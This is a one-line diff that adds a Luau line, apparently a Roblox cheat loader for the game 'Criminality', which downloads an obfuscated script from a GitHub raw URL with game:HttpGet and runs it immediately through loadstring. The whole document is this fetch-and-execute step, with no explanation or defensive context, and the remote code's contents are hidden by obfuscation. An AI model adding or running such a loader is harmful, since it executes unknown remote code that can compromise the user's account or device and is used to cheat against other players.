@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fortnitebuns821-eng/criminality-suite/main/criminality_obf.luau"))()
